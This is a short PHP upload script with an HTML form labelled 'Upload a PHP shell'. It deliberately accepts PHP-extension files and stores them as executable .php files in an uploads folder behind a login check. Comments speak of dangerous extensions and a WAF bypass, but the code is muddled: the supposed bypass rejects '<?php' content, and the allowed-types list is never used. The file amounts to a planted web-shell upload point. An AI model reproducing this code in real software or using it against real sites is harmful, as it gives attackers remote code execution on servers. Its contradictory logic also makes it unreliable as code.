<?php
// upload.php

session_start();
if (!isset($_SESSION['logged_in'])) {
    echo "You must log in first.";
    exit;
}

$upload_dir = "uploads/";
$allowed_types = ['php', 'php5', 'phtml', 'jpg', 'jpeg']; // Dangerous extensions

// Obfuscate code and add WAF bypass
if (isset($_FILES['file'])) {
    $target_file = $upload_dir . basename($_FILES['file']['name']);
    $file_type = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // WAF Bypass - Check the file for PHP content (bypass WAF)
    $file_content = file_get_contents($_FILES['file']['tmp_name']);
    if (strpos($file_content, '<?php') !== false) {
        echo "Invalid file content!";
        exit;
    }

    if (strpos($file_type, 'php') !== false) {
        // If file is a PHP web shell
        $encoded_filename = base64_encode($_FILES['file']['name']);
        $target_file = $upload_dir . $encoded_filename . ".php";

        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            echo "File uploaded successfully!";
        } else {
            echo "Error uploading the file.";
        }
    } else {
        echo "Invalid file type!";
    }
}
?>

<form action="upload.php" method="POST" enctype="multipart/form-data">
    Upload a PHP shell:
    <input type="file" name="file">
    <input type="submit" value="Upload File">
</form>
